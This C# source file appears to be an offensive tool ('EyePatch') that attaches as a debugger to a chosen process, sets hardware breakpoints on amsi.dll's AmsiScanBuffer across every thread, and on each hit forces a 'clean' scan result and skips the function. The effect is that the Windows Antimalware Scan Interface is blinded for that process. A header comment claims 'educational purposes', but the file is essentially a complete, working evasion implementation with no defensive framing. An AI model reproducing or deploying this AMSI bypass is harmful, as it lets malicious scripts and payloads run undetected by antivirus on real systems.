using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Runtime.Remoting.Contexts;
using System.Text;
using System.Threading;
using static EyePatch.Patch.Native;
namespace EyePatch.Patch
{



    // Main logic HardwareBreakpoint for Amsi made by https://github.com/AceYonca    educational purposes of course ;3
    internal static class HardwareBreakpoint
    {

        private static Process _targetProcess;
        private static IntPtr _breakpointAddress;
        private static volatile bool _debugLoopRunning;


        public static CONTEXT64 CreateContext()
        {
            return new CONTEXT64
            {
                ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL_NEEDED,
                FltSave = new XSAVE_FORMAT64
                {
                    FloatRegisters = new M128A[8],
                    XmmRegisters = new M128A[16],
                    Reserved4 = new byte[96]
                },
                VectorRegister = new M128A[26]
            };
        }

        private static bool IsProcess64Bit(Process process)
        {
            if (!Environment.Is64BitOperatingSystem)
                return false;

            if (!IsWow64Process(process.Handle, out bool isWow64))
                throw new Win32Exception(Marshal.GetLastWin32Error());

            return !isWow64;
        }

        private static Action<string> _log = message => Console.WriteLine(message);

        private static void LogMessage(string message)
        {
            _log?.Invoke(message);
        }
        private static readonly ManualResetEventSlim _debugAttachReady = new ManualResetEventSlim(false);

        private static int _pendingPid;
        private static Exception _attachException;

        private static bool _targetIs64Bit;


        internal static void Invoke(int pid, Action<string> logger = null)
        {
            if (logger != null)
                _log = logger;

            if (_targetProcess != null)
                throw new InvalidOperationException("Debugger is already attached.");

            if (pid == Process.GetCurrentProcess().Id)
                throw new InvalidOperationException("Cannot attach debugger to current process.");

            _pendingPid = pid;
            _attachException = null;
            _debugAttachReady.Reset();

            _targetProcess = Process.GetProcessById(pid);
            _targetIs64Bit = IsProcess64Bit(_targetProcess);

            _targetIsWow64 = false;
            if (Environment.Is64BitOperatingSystem)
                IsWow64Process(_targetProcess.Handle, out _targetIsWow64);


            _debugLoopRunning = true;

            Thread debugThread = new Thread(DebugLoop)
            {
                IsBackground = true
            };

            debugThread.Start();

            if (!_debugAttachReady.Wait(5000))
                throw new TimeoutException("Debugger attach did not finish.");

            if (_attachException != null)
                throw _attachException;

            SetupRemoteBreakpoint();

            LogMessage(
                _targetIs64Bit
                    ? "x64 breakpoint installed. You can now type in the target console."
                    : "x86 breakpoint installed. You can now type in the target console.");
        }
        internal static void Stop()
        {
            Cleanup();
        }
        private static IntPtr ResolveRemoteExport(Process process, string moduleName, string exportName)
        {
            IntPtr remoteBase = FindModuleInProcess(process.Id, moduleName);

            if (remoteBase == IntPtr.Zero)
                throw new Exception($"{moduleName} not found in target process");

            bool targetWow64 = false;

            if (Environment.Is64BitOperatingSystem)
                IsWow64Process(process.Handle, out targetWow64);

            // x64 debugger -> x86 target
            // Cannot use LoadLibrary/GetProcAddress because that loads x64 DLL.
            if (targetWow64 && Environment.Is64BitProcess)
            {
                string dllPath = FindModulePathInProcess(process.Id, moduleName);

                if (string.IsNullOrEmpty(dllPath))
                    throw new Exception($"Could not find path for {moduleName} in target process");

                uint rva = GetExportRvaFromFile(dllPath, exportName);

                return new IntPtr(remoteBase.ToInt64() + rva);
            }

            // Same-architecture path
            IntPtr localModule = LoadLibrary(moduleName);

            if (localModule == IntPtr.Zero)
                throw new Win32Exception(
                    Marshal.GetLastWin32Error(),
                    $"Failed to load {moduleName} locally");

            try
            {
                IntPtr localExport = GetProcAddress(localModule, exportName);

                if (localExport == IntPtr.Zero)
                    throw new Win32Exception(
                        Marshal.GetLastWin32Error(),
                        $"Failed to resolve {exportName}");

                long rva = localExport.ToInt64() - localModule.ToInt64();

                return new IntPtr(remoteBase.ToInt64() + rva);
            }
            finally
            {
                FreeLibrary(localModule);
            }
        }

        private static string FindModulePathInProcess(int pid, string moduleName)
        {
            IntPtr snapshot = CreateToolhelp32Snapshot(
                TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
                (uint)pid);

            if (snapshot == IntPtr.Zero || snapshot == INVALID_HANDLE_VALUE)
                return null;

            try
            {
                MODULEENTRY32 module = new MODULEENTRY32();
                module.dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32));

                if (!Module32First(snapshot, ref module))
                    return null;

                do
                {
                    if (module.szModule.Equals(
                        moduleName,
                        StringComparison.OrdinalIgnoreCase))
                    {
                        return module.szExePath;
                    }
                }
                while (Module32Next(snapshot, ref module));
            }
            finally
            {
                CloseHandle(snapshot);
            }

            return null;
        }

        private static uint GetExportRvaFromFile(string dllPath, string exportName)
        {
            byte[] file = File.ReadAllBytes(dllPath);

            int peOffset = BitConverter.ToInt32(file, 0x3C);

            ushort numberOfSections = BitConverter.ToUInt16(file, peOffset + 6);
            ushort sizeOfOptionalHeader = BitConverter.ToUInt16(file, peOffset + 20);

            int optionalHeader = peOffset + 24;

            ushort magic = BitConverter.ToUInt16(file, optionalHeader);

            bool isPE32Plus = magic == 0x20B;

            int dataDirectory = isPE32Plus
                ? optionalHeader + 112
                : optionalHeader + 96;

            uint exportTableRva = BitConverter.ToUInt32(file, dataDirectory);

            if (exportTableRva == 0)
                throw new Exception("DLL has no export table.");

            int sectionTable = optionalHeader + sizeOfOptionalHeader;

            int RvaToOffset(uint rva)
            {
                for (int i = 0; i < numberOfSections; i++)
                {
                    int section = sectionTable + i * 40;

                    uint virtualSize = BitConverter.ToUInt32(file, section + 8);
                    uint virtualAddress = BitConverter.ToUInt32(file, section + 12);
                    uint rawSize = BitConverter.ToUInt32(file, section + 16);
                    uint rawPointer = BitConverter.ToUInt32(file, section + 20);

                    uint size = Math.Max(virtualSize, rawSize);

                    if (rva >= virtualAddress && rva < virtualAddress + size)
                        return (int)(rawPointer + (rva - virtualAddress));
                }

                throw new Exception(
                    "Failed to map RVA to file offset: 0x" + rva.ToString("X"));
            }

            int exportOffset = RvaToOffset(exportTableRva);

            uint numberOfNames = BitConverter.ToUInt32(file, exportOffset + 24);
            uint addressOfFunctions = BitConverter.ToUInt32(file, exportOffset + 28);
            uint addressOfNames = BitConverter.ToUInt32(file, exportOffset + 32);
            uint addressOfNameOrdinals = BitConverter.ToUInt32(file, exportOffset + 36);

            int namesOffset = RvaToOffset(addressOfNames);
            int ordinalsOffset = RvaToOffset(addressOfNameOrdinals);
            int functionsOffset = RvaToOffset(addressOfFunctions);

            for (int i = 0; i < numberOfNames; i++)
            {
                uint nameRva = BitConverter.ToUInt32(namesOffset + i * 4 < file.Length
                    ? file
                    : throw new Exception("Invalid export name RVA"), namesOffset + i * 4);

                int nameOffset = RvaToOffset(nameRva);

                string name = ReadAsciiNullTerminated(file, nameOffset);

                if (!name.Equals(exportName, StringComparison.Ordinal))
                    continue;

                ushort ordinal = BitConverter.ToUInt16(file, ordinalsOffset + i * 2);

                uint functionRva = BitConverter.ToUInt32(file, functionsOffset + ordinal * 4);

                return functionRva;
            }

            throw new Exception($"Export {exportName} not found in {dllPath}");
        }

        private static string ReadAsciiNullTerminated(byte[] data, int offset)
        {
            int end = offset;

            while (end < data.Length && data[end] != 0)
                end++;

            return Encoding.ASCII.GetString(data, offset, end - offset);
        }

        private static readonly HashSet<uint> _patchedThreads = new HashSet<uint>();
        private static void SetupRemoteBreakpoint()
        {

            bool self64 = Environment.Is64BitProcess;
            bool os64 = Environment.Is64BitOperatingSystem;

            bool targetWow64 = false;
            if (os64)
                IsWow64Process(_targetProcess.Handle, out targetWow64);

            bool target64 = os64 && !targetWow64;

            if (!self64 && target64)
            {
                LogMessage("Cannot set x64 hardware breakpoints from a 32-bit debugger.");
                return;
            }




            IntPtr AmsiBufferAddress = ResolveRemoteExport(
                _targetProcess,
                "amsi.dll",
                "AmsiScanBuffer");

            _breakpointAddress = AmsiBufferAddress;

            LogMessage($"Setting hardware breakpoint at 0x{AmsiBufferAddress.ToInt64():X}");
            int installed = 0;



            foreach (ProcessThread thread in _targetProcess.Threads)
            {
                uint threadId = (uint)thread.Id;

                IntPtr hThread = OpenThread(
                    THREAD_GET_CONTEXT |
                    THREAD_SET_CONTEXT |
                    THREAD_SUSPEND_RESUME,
                    false,
                    threadId);

                if (hThread == IntPtr.Zero)
                    continue;

                bool suspended = false;

                try
                {
                    if (SuspendThread(hThread) == 0xFFFFFFFF)
                        continue;

                    suspended = true;

                    bool ok = false;

                    if (targetWow64)
                    {
                        CONTEXT32 context = CreateContext32();

                        if (!Wow64GetThreadContext(hThread, ref context))
                            continue;

                        if (AmsiBufferAddress == IntPtr.Zero || AmsiBufferAddress.ToInt64() > uint.MaxValue)
                        {
                            LogMessage("Invalid x86 breakpoint address: 0x" + AmsiBufferAddress.ToInt64().ToString("X"));
                            continue;
                        }

                        EnableBreakpoint32(ref context, AmsiBufferAddress, 0);

                        if (!Wow64SetThreadContext(hThread, ref context))
                            continue;

                        ok = true;
                    }
                    else if (target64)
                    {
                        CONTEXT64 context = CreateContext();

                        if (!GetThreadContext(hThread, ref context))
                            continue;

                        EnableBreakpoint64(ref context, AmsiBufferAddress, 0);

                        if (!SetThreadContext(hThread, ref context))
                            continue;

                        ok = true;
                    }
                    else
                    {
                        CONTEXT32 context = CreateContext32();

                        if (!GetThreadContext32(hThread, ref context))
                            continue;

                        EnableBreakpoint32(ref context, AmsiBufferAddress, 0);

                        if (!SetThreadContext32(hThread, ref context))
                            continue;

                        ok = true;
                    }
                    if (ok)
                    {
                        installed++;
                        _patchedThreads.Add(threadId);
                    }
                }

                finally
                {
                    if (suspended)
                        ResumeThread(hThread);

                    CloseHandle(hThread);
                }
            }
        }


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool DebugSetProcessKillOnExit(bool KillOnExit);


        private static string Hex(IntPtr p) => $"0x{p.ToInt64():X}";
        private static string Hex(uint v) => $"0x{v:X8}";

        private static string ExceptionName(uint code)
        {
            switch (code)
            {
                case EXCEPTION_BREAKPOINT:
                    return "EXCEPTION_BREAKPOINT";

                case EXCEPTION_SINGLE_STEP:
                    return "EXCEPTION_SINGLE_STEP";

                case 0xC0000005:
                    return "EXCEPTION_ACCESS_VIOLATION";

                case 0xC000001D:
                    return "EXCEPTION_ILLEGAL_INSTRUCTION";

                case 0xC0000094:
                    return "EXCEPTION_INT_DIVIDE_BY_ZERO";

                case 0xC00000FD:
                    return "EXCEPTION_STACK_OVERFLOW";

                default:
                    return "UNKNOWN_EXCEPTION";
            }
        }
        private static void DebugLoop()
        {
            try
            {
                if (!DebugActiveProcess((uint)_pendingPid))
                {
                    int err = Marshal.GetLastWin32Error();

                    _attachException = new Win32Exception(
                        err,
                        "Failed to attach debugger");

                    LogMessage($"Debug attach failed: {err}");

                    _debugAttachReady.Set();
                    return;
                }

                DebugSetProcessKillOnExit(false);

                LogMessage($"Debugger attached to PID {_pendingPid}");
            }
            catch (Exception ex)
            {
                _attachException = ex;
                LogMessage($"Debug attach exception: {ex.Message}");
                _debugAttachReady.Set();
                return;
            }

            while (_debugLoopRunning)
            {
                DEBUG_EVENT debugEvent;

                if (!WaitForDebugEvent(out debugEvent, 100))
                    continue;

                uint continueStatus = DBG_CONTINUE;
                bool signalAttachReady = !_debugAttachReady.IsSet;

                try
                {
                    switch ((DebugEventCode)debugEvent.dwDebugEventCode)
                    {
                        case DebugEventCode.CREATE_THREAD_DEBUG_EVENT:
                            if (_breakpointAddress != IntPtr.Zero)
                                PatchThread(debugEvent.dwThreadId);

                            continueStatus = DBG_CONTINUE;
                            break;

                        case DebugEventCode.EXIT_PROCESS_DEBUG_EVENT:

                            _debugLoopRunning = false;
                            continueStatus = DBG_CONTINUE;
                            break;

                        case DebugEventCode.EXCEPTION_DEBUG_EVENT:
                            {
                                var ex = debugEvent.u.Exception;
                                var record = ex.ExceptionRecord;

                                uint code = record.ExceptionCode;
                                IntPtr address = record.ExceptionAddress;

                                if (code == EXCEPTION_BREAKPOINT)
                                {
                                    continueStatus = DBG_CONTINUE;
                                    break;
                                }

                                bool isHardwareBreakpoint =
                                    code == EXCEPTION_SINGLE_STEP ||
                                    code == STATUS_WX86_SINGLE_STEP;

                                if (isHardwareBreakpoint)
                                {
                                    if (_breakpointAddress != IntPtr.Zero &&
                                        address == _breakpointAddress)
                                    {
                                        try
                                        {
                                            bool handled = HandleBreakpoint(debugEvent);

                                            continueStatus = handled
                                                ? DBG_CONTINUE
                                                : DBG_EXCEPTION_NOT_HANDLED;

                                            if (!handled)
                                            {
                                                LogMessage(
                                                    "Breakpoint handler failed.");
                                            }
                                        }
                                        catch (Exception bpEx)
                                        {
                                            LogMessage(
                                                $"Breakpoint exception: {bpEx.Message}");

                                            continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                                        }
                                    }
                                    else
                                    {
                                        continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                                    }

                                    break;
                                }

                                bool firstChance = ex.dwFirstChance != 0;

                                LogMessage(
                                    $"Exception: {ExceptionName(code)} " +
                                    $"{Hex(code)} at {Hex(address)}" +
                                    (firstChance ? "" : " [SECOND CHANCE]"));

                                continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                                break;
                            }

                        default:
                            continueStatus = DBG_CONTINUE;
                            break;
                    }
                }
                catch (Exception ex)
                {
                    LogMessage($"Debug loop exception: {ex.Message}");
                    continueStatus = DBG_EXCEPTION_NOT_HANDLED;
                }
                finally
                {
                    ContinueDebugEvent(
                        debugEvent.dwProcessId,
                        debugEvent.dwThreadId,
                        continueStatus);

                    if (signalAttachReady && !_debugAttachReady.IsSet)
                        _debugAttachReady.Set();
                }
            }

            try
            {
                Process target = _targetProcess;

                if (target != null)
                {
                    DebugActiveProcessStop((uint)target.Id);
                    LogMessage("Debugger detached.");
                }
            }
            catch (Exception ex)
            {
                LogMessage("Debugger detach error: " + ex.Message);
            }
            finally
            {
                if (_targetProcess != null)
                    _targetProcess.Dispose();

                _targetProcess = null;
                _breakpointAddress = IntPtr.Zero;
                _pendingPid = 0;
                _attachException = null;
                _patchedThreads.Clear();

                _debugAttachReady.Set();

                LogMessage("Debugger cleanup completed.");
            }
        }



        private static ulong ReadUInt64Remote(IntPtr hProcess, IntPtr address)
        {
            byte[] buffer = new byte[8];

            if (!ReadProcessMemory(hProcess, address, buffer, buffer.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "ReadProcessMemory failed");

            return BitConverter.ToUInt64(buffer, 0);
        }

        private static IntPtr ReadIntPtrRemote(IntPtr hProcess, IntPtr address)
        {
            ulong value = ReadUInt64Remote(hProcess, address);
            return new IntPtr(unchecked((long)value));
        }



        private static uint ReadUInt32Remote(IntPtr hProcess, IntPtr address)
        {
            byte[] buffer = new byte[4];

            if (!ReadProcessMemory(hProcess, address, buffer, buffer.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "ReadProcessMemory failed");

            return BitConverter.ToUInt32(buffer, 0);
        }

        private static IntPtr ReadIntPtr32Remote(IntPtr hProcess, IntPtr address)
        {
            uint value = ReadUInt32Remote(hProcess, address);
            return new IntPtr(unchecked((int)value));
        }



        private static void WriteInt32Remote(IntPtr hProcess, IntPtr address, int value)
        {
            byte[] buffer = BitConverter.GetBytes(value);

            if (!WriteProcessMemory(hProcess, address, buffer, buffer.Length, out _))
                throw new Win32Exception(Marshal.GetLastWin32Error(), "WriteProcessMemory failed");
        }

        private const int Amsi_Result_Clean = 0;

        private static bool IsCanonicalUserAddress(ulong address)
        {
            return address >= 0x10000UL &&
                   address <= 0x00007FFFFFFFFFFFUL;
        }

        private static bool IsPlausibleStackPointer(ulong rsp)
        {
            return IsCanonicalUserAddress(rsp) &&
                   (rsp % 8UL) == 0;
        }

        private static bool HandleBreakpoint(DEBUG_EVENT debugEvent)
        {
            var exception = debugEvent.u.Exception.ExceptionRecord;

            if (exception.ExceptionAddress != _breakpointAddress)
                return false;

            IntPtr hThread = OpenThread(
                THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                false,
                debugEvent.dwThreadId);

            if (hThread == IntPtr.Zero)
                return false;

            try
            {
                return _targetIs64Bit
                    ? HandleBreakpoint64(hThread)
                    : HandleBreakpoint32(hThread);
            }
            finally
            {
                CloseHandle(hThread);
            }
        }


        private static bool HandleBreakpoint64(IntPtr hThread)
        {
            CONTEXT64 context = CreateContext();

            if (!GetThreadContext(hThread, ref context))
                return false;

            IntPtr hProcess = _targetProcess.Handle;

            if (!IsPlausibleStackPointer(context.Rsp))
                return false;

            ulong returnAddress = ReadUInt64Remote(
                hProcess,
                new IntPtr(unchecked((long)context.Rsp)));

            if (!IsCanonicalUserAddress(returnAddress))
                return false;

            // x64 Windows ABI:
            // [RSP]      = return address
            // [RSP+8]    = shadow space arg1
            // [RSP+16]   = shadow space arg2
            // [RSP+24]   = shadow space arg3
            // [RSP+32]   = shadow space arg4
            // [RSP+40]   = arg5
            // [RSP+48]   = arg6
            ulong resultSlot = context.Rsp + 6UL * 8UL;

            if (!IsCanonicalUserAddress(resultSlot))
                return false;

            IntPtr resultPtr = ReadIntPtrRemote(
                hProcess,
                new IntPtr(unchecked((long)resultSlot)));

            ulong resultAddress = unchecked((ulong)resultPtr.ToInt64());

            if (resultPtr != IntPtr.Zero && IsCanonicalUserAddress(resultAddress))
                WriteInt32Remote(hProcess, resultPtr, Amsi_Result_Clean);

            context.Rip = returnAddress;
            context.Rsp += 8;
            context.Rax = 0;
            context.Dr6 = 0;


            if (!SetThreadContext(hThread, ref context))
                return false;

            LogMessage("x64 breakpoint handled.");
            return true;
        }

        private static bool _targetIsWow64;
        private static bool HandleBreakpoint32(IntPtr hThread)
        {
            LogMessage("HandleBreakpoint32 entered.");



            CONTEXT32 context = CreateContext32();

            bool gotContext = _targetIsWow64
                ? Wow64GetThreadContext(hThread, ref context)
                : GetThreadContext32(hThread, ref context);

            if (!gotContext)
                return false;

            IntPtr hProcess = _targetProcess.Handle;

            if (!IsPlausibleStackPointer32(context.Esp))
                return false;

            uint returnAddress = ReadUInt32Remote(
                hProcess,
                new IntPtr(unchecked((int)context.Esp)));

            if (!IsCanonicalUserAddress32(returnAddress))
                return false;

            uint resultSlot = context.Esp + 24u;

            uint resultAddress = ReadUInt32Remote(
            hProcess,
            new IntPtr(unchecked((int)resultSlot)));

            LogMessage($"x86 ESP=0x{context.Esp:X8}");
            LogMessage($"x86 resultSlot=0x{resultSlot:X8}");
            LogMessage($"x86 resultPtr=0x{resultAddress:X8}");

            if (resultAddress >= 0x10000u && resultAddress < 0x80000000u)
            {
                WriteInt32Remote(
                    hProcess,
                    new IntPtr(unchecked((int)resultAddress)),
                    Amsi_Result_Clean);
            }
            else
            {
                LogMessage("x86 result pointer invalid/null; skipping write.");
            }

            context.Eip = returnAddress;
            context.Esp += 28;
            context.Eax = 0;
            context.Dr6 = 0;


            bool setContext = _targetIsWow64
                ? Wow64SetThreadContext(hThread, ref context)
                : SetThreadContext32(hThread, ref context);

            if (!setContext)
                return false;

            LogMessage("x86 breakpoint handled.");
            return true;
        }

        private static bool IsCanonicalUserAddress32(uint address)
        {
            return address >= 0x10000u &&
                   address < 0x80000000u;
        }

        private static bool IsPlausibleStackPointer32(uint esp)
        {
            return IsCanonicalUserAddress32(esp) &&
                   (esp % 4u) == 0;
        }
        private static void EnableBreakpoint64(ref CONTEXT64 context, IntPtr address, int index)
        {
            if ((uint)index > 3)
                throw new ArgumentOutOfRangeException(nameof(index));

            ulong addr = (ulong)address.ToInt64();

            switch (index)
            {
                case 0: context.Dr0 = addr; break;
                case 1: context.Dr1 = addr; break;
                case 2: context.Dr2 = addr; break;
                case 3: context.Dr3 = addr; break;
            }

            context.Dr7 = SetBits(context.Dr7, 16, 16, 0);
            context.Dr7 = SetBits(context.Dr7, index * 2, 1, 1);
            context.Dr6 = 0;
        }

        private static void EnableBreakpoint32(ref CONTEXT32 context, IntPtr address, int index)
        {
            if ((uint)index > 3)
                throw new ArgumentOutOfRangeException(nameof(index));

            long rawAddress = address.ToInt64();

            if (rawAddress <= 0 || rawAddress > uint.MaxValue)
                throw new ArgumentOutOfRangeException(nameof(address),
                    "x86 hardware breakpoint address must fit in 32-bit address space.");

            uint addr = unchecked((uint)rawAddress);

            switch (index)
            {
                case 0: context.Dr0 = addr; break;
                case 1: context.Dr1 = addr; break;
                case 2: context.Dr2 = addr; break;
                case 3: context.Dr3 = addr; break;
            }

            // Clear LEN/RW fields for this breakpoint only.
            // RW=00 execute, LEN=00 one byte.
            int controlBit = 16 + index * 4;
            context.Dr7 = (uint)SetBits(context.Dr7, controlBit, 4, 0);

            // Enable local breakpoint L0/L1/L2/L3.
            context.Dr7 = (uint)SetBits(context.Dr7, index * 2, 1, 1);

            context.Dr6 = 0;
        }




        private static void DisableBreakpoint64(ref CONTEXT64 context, int index)
        {
            if ((uint)index > 3)
                throw new ArgumentOutOfRangeException(nameof(index));

            // Clear local enable bit (L0/L1/L2/L3)
            ulong mask = 1UL << (index * 2);
            context.Dr7 &= ~mask;

            // Optional: clear condition/length bits too
            context.Dr7 &= ~(0xFUL << (16 + index * 4));

            // Clear status bit
            context.Dr6 &= ~(1UL << index);

            // Clear address register
            switch (index)
            {
                case 0:
                    context.Dr0 = 0;
                    break;

                case 1:
                    context.Dr1 = 0;
                    break;

                case 2:
                    context.Dr2 = 0;
                    break;

                case 3:
                    context.Dr3 = 0;
                    break;
            }
        }

        private static void DisableBreakpoint32(ref CONTEXT32 context, int index)
        {
            if ((uint)index > 3)
                throw new ArgumentOutOfRangeException(nameof(index));

            // Clear local enable bit (L0/L1/L2/L3)
            uint mask = 1u << (index * 2);
            context.Dr7 &= ~mask;

            // Optional: clear RW/LEN fields
            context.Dr7 &= ~(0xFu << (16 + index * 4));

            // Clear status bit
            context.Dr6 &= ~(1u << index);

            // Clear address register
            switch (index)
            {
                case 0:
                    context.Dr0 = 0;
                    break;

                case 1:
                    context.Dr1 = 0;
                    break;

                case 2:
                    context.Dr2 = 0;
                    break;

                case 3:
                    context.Dr3 = 0;
                    break;
            }
        }

        private static ulong SetBits(ulong value, int lowBit, int bits, ulong newValue)
        {
            if (bits <= 0 || bits > 64)
                throw new ArgumentOutOfRangeException(nameof(bits));

            if (lowBit < 0 || lowBit >= 64)
                throw new ArgumentOutOfRangeException(nameof(lowBit));

            if (lowBit + bits > 64)
                throw new ArgumentOutOfRangeException(nameof(bits));

            ulong mask = bits == 64 ? ulong.MaxValue : (1UL << bits) - 1UL;

            value &= ~(mask << lowBit);
            value |= (newValue & mask) << lowBit;

            return value;
        }

        private const uint TH32CS_SNAPMODULE = 0x00000008;
        private const uint TH32CS_SNAPMODULE32 = 0x00000010;
        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);



        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct MODULEENTRY32
        {
            public uint dwSize;
            public uint th32ModuleID;
            public uint th32ProcessID;
            public uint GlblcntUsage;
            public uint ProccntUsage;
            public IntPtr modBaseAddr;
            public uint modBaseSize;
            public IntPtr hModule;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
            public string szModule;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szExePath;
        }

        private static IntPtr FindModuleInProcess(int pid, string moduleName)
        {
            IntPtr snapshot = CreateToolhelp32Snapshot(
                TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
                (uint)pid);

            if (snapshot == INVALID_HANDLE_VALUE)
                return IntPtr.Zero;

            try
            {
                MODULEENTRY32 module = new MODULEENTRY32();
                module.dwSize = (uint)Marshal.SizeOf(typeof(MODULEENTRY32));

                if (!Module32First(snapshot, ref module))
                    return IntPtr.Zero;

                do
                {
                    if (module.szModule.Equals(moduleName, StringComparison.OrdinalIgnoreCase))
                        return module.modBaseAddr;

                } while (Module32Next(snapshot, ref module));

                return IntPtr.Zero;
            }
            finally
            {
                CloseHandle(snapshot);
            }
        }

        private static void PatchThread(uint threadId)
        {
            IntPtr hThread = OpenThread(
                THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
                false,
                threadId);

            if (hThread == IntPtr.Zero)
                return;

            bool suspended = false;

            try
            {
                if (SuspendThread(hThread) == 0xFFFFFFFF)
                    return;

                suspended = true;

                bool targetWow64 = false;
                if (Environment.Is64BitOperatingSystem)
                    IsWow64Process(_targetProcess.Handle, out targetWow64);

                bool target64 = Environment.Is64BitOperatingSystem && !targetWow64;

                bool ok = false;

                if (targetWow64)
                {
                    CONTEXT32 context = CreateContext32();

                    if (Wow64GetThreadContext(hThread, ref context))
                    {
                        EnableBreakpoint32(ref context, _breakpointAddress, 0);
                        ok = Wow64SetThreadContext(hThread, ref context);
                    }
                }
                else if (target64)
                {
                    CONTEXT64 context = CreateContext();

                    if (GetThreadContext(hThread, ref context))
                    {
                        EnableBreakpoint64(ref context, _breakpointAddress, 0);
                        ok = SetThreadContext(hThread, ref context);
                    }
                }
                else
                {
                    CONTEXT32 context = CreateContext32();

                    if (GetThreadContext32(hThread, ref context))
                    {
                        EnableBreakpoint32(ref context, _breakpointAddress, 0);
                        ok = SetThreadContext32(hThread, ref context);
                    }
                }

                if (ok)
                    _patchedThreads.Add(threadId);
            }
            finally
            {
                if (suspended)
                    ResumeThread(hThread);

                CloseHandle(hThread);
            }
        }
        private static void Cleanup()
        {
            Process target = _targetProcess;

            _debugLoopRunning = false;

            if (target == null)
                return;

            try
            {
                bool targetWow64 = false;
                bool target64 = false;

                if (Environment.Is64BitOperatingSystem)
                {
                    IsWow64Process(target.Handle, out targetWow64);
                    target64 = !targetWow64;
                }

                foreach (uint threadId in _patchedThreads.ToList())
                {
                    IntPtr hThread = OpenThread(
THREAD_GET_CONTEXT |
THREAD_SET_CONTEXT |
THREAD_SUSPEND_RESUME |
THREAD_QUERY_INFORMATION,

false,
                        threadId);

                    if (hThread == IntPtr.Zero)
                        continue;

                    bool suspended = false;

                    try
                    {
                        if (SuspendThread(hThread) == 0xFFFFFFFF)
                            continue;

                        suspended = true;

                        if (targetWow64)
                        {
                            CONTEXT32 context = CreateContext32();

                            if (Wow64GetThreadContext(hThread, ref context))
                            {
                                DisableBreakpoint32(ref context, 0);
                                Wow64SetThreadContext(hThread, ref context);
                            }
                        }
                        else if (target64)
                        {
                            CONTEXT64 context = CreateContext();

                            if (GetThreadContext(hThread, ref context))
                            {
                                DisableBreakpoint64(ref context, 0);
                                SetThreadContext(hThread, ref context);
                            }
                        }
                        else
                        {
                            CONTEXT32 context = CreateContext32();

                            if (GetThreadContext32(hThread, ref context))
                            {
                                DisableBreakpoint32(ref context, 0);
                                SetThreadContext32(hThread, ref context);
                            }
                        }
                    }
                    finally
                    {
                        if (suspended)
                            ResumeThread(hThread);

                        CloseHandle(hThread);
                    }
                }

                _patchedThreads.Clear();

            }
            catch (Exception ex)
            {
                LogMessage($"Error during cleanup: {ex.Message}");
            }
            finally
            {
                _breakpointAddress = IntPtr.Zero;

                LogMessage("Debugger cleanup completed.");
            }
        }
    }
}